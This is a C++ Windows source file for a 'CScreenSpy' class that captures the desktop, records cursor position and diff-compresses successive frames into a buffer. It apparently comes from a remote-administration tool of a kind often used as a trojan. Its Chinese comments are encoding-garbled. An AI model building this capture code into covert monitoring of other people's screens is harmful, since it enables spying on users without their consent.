#include "ScreenSpy.h"




#define ALGORITHM_DIFF 1
CScreenSpy::CScreenSpy()
{

}


CScreenSpy::CScreenSpy(ULONG BitmapCount)
{
	
	m_Algorithm = ALGORITHM_DIFF; 
	switch (BitmapCount)
	{
	case 16:
	case 32:
	{
		m_BitmapCount = BitmapCount;
		break;
	}		
	default:
		m_BitmapCount = 16;
	}

	m_FullWidth  = GetSystemMetrics(SM_CXSCREEN);    //��Ļ�ķֱ���
	m_FullHeight = GetSystemMetrics(SM_CYSCREEN);

	m_BitmapInfo = OnInitBitmapInfo(m_BitmapCount, m_FullWidth, m_FullHeight);  //����λͼ��Ϣ ����(��һ��)



	//�����Ļ���
	m_DesktopHwnd = GetDesktopWindow();
	m_DesktopDCHandle = GetDC(m_DesktopHwnd);
	
	
	
	
	//��һ֡
	m_DesktopMemoryDCHandle = CreateCompatibleDC(m_DesktopDCHandle);
	m_BitmapHandle = ::CreateDIBSection(m_DesktopDCHandle, m_BitmapInfo,
		DIB_RGB_COLORS, &m_BitmapData, NULL, NULL);
	::SelectObject(m_DesktopMemoryDCHandle, m_BitmapHandle);


	m_DiffMemoryDCHandle = CreateCompatibleDC(m_DesktopDCHandle);
	m_DiffBitmapHandle = ::CreateDIBSection(m_DesktopDCHandle, m_BitmapInfo,
		DIB_RGB_COLORS, &m_DiffBitmapData, NULL, NULL);
	::SelectObject(m_DiffMemoryDCHandle, m_DiffBitmapHandle);



	m_Offset = 0;
	m_BufferData = new BYTE[m_BitmapInfo->bmiHeader.biSizeImage*2];

}


CScreenSpy::~CScreenSpy()
{

	ReleaseDC(m_DesktopHwnd, m_DesktopDCHandle);   //GetDC
	if (m_DesktopMemoryDCHandle != NULL)
	{
		DeleteDC(m_DesktopMemoryDCHandle);                 //Createƥ���ڴ�DC

		::DeleteObject(m_BitmapHandle);
		if (m_BitmapData != NULL)
		{
			m_BitmapData = NULL;
		}

		m_DesktopMemoryDCHandle = NULL;

	}

	if (m_DiffMemoryDCHandle != NULL)
	{
		DeleteDC(m_DiffMemoryDCHandle);                //Createƥ���ڴ�DC

		::DeleteObject(m_DiffBitmapHandle);
		if (m_DiffBitmapData != NULL)
		{
			m_DiffBitmapData = NULL;
		}
	}

	if (m_BitmapInfo != NULL)   //������Ϣͷ
	{
		delete[] m_BitmapInfo;
		m_BitmapInfo = NULL;
	}

	if (m_BufferData)    //��������Ϣ
	{
		delete[] m_BufferData;
		m_BufferData = NULL;
	}

	m_Offset = 0;
}
LPBITMAPINFO CScreenSpy::OnInitBitmapInfo(ULONG BitmapCount,
	ULONG FullWidth, ULONG FullHeight)//����λͼ
{


	//[BITMAPINFOHEADER]
	ULONG BufferLength = sizeof(BITMAPINFOHEADER);
	BITMAPINFO* BitmapInfo = (BITMAPINFO *) new BYTE[BufferLength];

	BITMAPINFOHEADER* BitmapInfoHeader = &(BitmapInfo->bmiHeader);

	
	
	BitmapInfoHeader->biSize = sizeof(BITMAPINFOHEADER);
	BitmapInfoHeader->biWidth =  FullWidth; //1080
	BitmapInfoHeader->biHeight = FullHeight; //1920
	BitmapInfoHeader->biPlanes = 1;
	BitmapInfoHeader->biBitCount = BitmapCount; //16
	BitmapInfoHeader->biCompression = BI_RGB;
	BitmapInfoHeader->biXPelsPerMeter = 0;
	BitmapInfoHeader->biYPelsPerMeter = 0;
	BitmapInfoHeader->biClrUsed = 0;
	BitmapInfoHeader->biClrImportant = 0;
	BitmapInfoHeader->biSizeImage =
		((BitmapInfoHeader->biWidth * BitmapInfoHeader->biBitCount + 31) / 32) * 4 * BitmapInfoHeader->biHeight;

	return BitmapInfo;
}   //

ULONG CScreenSpy::GetBitmapInfoSize()
{
	return sizeof(BITMAPINFOHEADER);
}
LPBITMAPINFO CScreenSpy::GetBitmapInfoData()
{
	return m_BitmapInfo;
}
LPVOID CScreenSpy::GetFirstScreenBufferData()
{
	//���ڴ�ԭ�豸�и���λͼ��Ŀ���豸
	::BitBlt(m_DesktopMemoryDCHandle, 0, 0,
		m_FullWidth, m_FullHeight, m_DesktopDCHandle, 0, 0, SRCCOPY);

	return m_BitmapData;  //�ڴ�
}
ULONG CScreenSpy::GetFirstScreenBufferSize()
{
	return m_BitmapInfo->bmiHeader.biSizeImage;
}
LPVOID CScreenSpy::GetNextScreenBufferData(ULONG* BufferLength)
{
	if (BufferLength == NULL || m_BufferData == NULL)
	{
		return NULL;
	}



	m_Offset = 0;


	// д��ʹ���������㷨
	WriteScreenBufferData((LPBYTE)&m_Algorithm, sizeof(m_Algorithm));

	// д����λ��
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	WriteScreenBufferData((LPBYTE)&CursorPos, sizeof(POINT));

	// д�뵱ǰ�������
	BYTE	CursorIndex = -1; //���дһ��
	WriteScreenBufferData(&CursorIndex, sizeof(BYTE));



	//m_BufferData [ALGORITHM_DIFF 4X 4Y BYTE                                                      ]  m_rectBufferOffset = 10



	// ����Ƚ��㷨
	if (m_Algorithm == ALGORITHM_DIFF)
	{
		// �ֶ�ɨ��ȫ��Ļ  ���µ�λͼ���뵽m_hDiffMemDC��
		ScanScreen(m_DiffMemoryDCHandle, m_DesktopDCHandle, m_BitmapInfo->bmiHeader.biWidth,
			m_BitmapInfo->bmiHeader.biHeight);

		//����Bit���бȽ������һ���޸�m_lpvFullBits�еķ���
		*BufferLength = m_Offset +
			CompareBitmap((LPBYTE)m_DiffBitmapData, (LPBYTE)m_BitmapData,
				m_BufferData + m_Offset, m_BitmapInfo->bmiHeader.biSizeImage);
		return m_BufferData;
	}
	
	return NULL;
}

ULONG CScreenSpy::CompareBitmap(LPBYTE NextScreenBufferData, LPBYTE FirstScreenBufferData,
	LPBYTE BufferData, DWORD ScreenBufferLength)
{
	// Windows�涨һ��ɨ������ռ���ֽ���������4�ı���, ������DWORD�Ƚ�
	LPDWORD	v1, v2;
	v1 = (LPDWORD)FirstScreenBufferData;
	v2 = (LPDWORD)NextScreenBufferData;

	//m_NextScreenBufferData [0004 0003 000A 000A 000A 0007 0000 ]  m_rectBufferOffset = 10

	// ƫ�Ƶ�ƫ�ƣ���ͬ���ȵ�ƫ��
	ULONG Offset = 0, v11 = 0, v22 = 0;
	ULONG Count = 0; // ���ݼ�����
					   // p1++ʵ�����ǵ�����һ��DWORD
	for (int i = 0; i < ScreenBufferLength; i += 4, v1++,v2++)   //HellAAArldlAD1C   HellAAArld1AD1A     BufferData[Pos][3][lAD][Pos][][]
	{
		if (*v1 == *v2)
			continue;
		// һ�������ݿ鿪ʼ
		// д��ƫ�Ƶ�ַ

		*(LPDWORD)(BufferData + Offset) = i; //λ��
		// ��¼���ݴ�С�Ĵ��λ��
		v11 = Offset + sizeof(int);  //4
		v22 = v11 + sizeof(int);     //8
		Count = 0; // ���ݼ���������

		// ����ǰһ֡����
		*v1 = *v2;
		*(LPDWORD)(BufferData + v22 + Count) = *v2;

		Count += 4;
		i += 4, v1++, v2++;
		for (int j = i; j < ScreenBufferLength; j += 4, i += 4, v1++, v2++)
		{
			if (*v1 == *v2)
				break;

			// ����Dest�е�����
			*v1 = *v2;
			*(LPDWORD)(BufferData + v22 + Count) = *v2;
			Count += 4;
		}
		// д�����ݳ���
		*(LPDWORD)(BufferData + v11) = Count;
		Offset = v22 + Count;
	}

	// nOffsetOffset ����д����ܴ�С
	return Offset;
}




VOID CScreenSpy::WriteScreenBufferData(LPBYTE	BufferData, ULONG BufferLength)
{
	memcpy(m_BufferData + m_Offset, BufferData, BufferLength);
	m_Offset += BufferLength;
}

VOID CScreenSpy::ScanScreen(HDC DestinationDCHandle, HDC SourceDCHandle, ULONG Width, ULONG Height)
{
	ULONG	JumpLine = 50;
	ULONG	JumpSleep = JumpLine / 10;

	for (int i = 0, ToJump = 0; i < Height; i += ToJump)
	{
		ULONG  v1 = Height - i;
		if (v1 > JumpLine)
			ToJump = JumpLine;
		else
			ToJump = v1;
		BitBlt(DestinationDCHandle, 0, i, Width, ToJump, SourceDCHandle, 0, i, SRCCOPY);
		Sleep(JumpSleep);
	}



}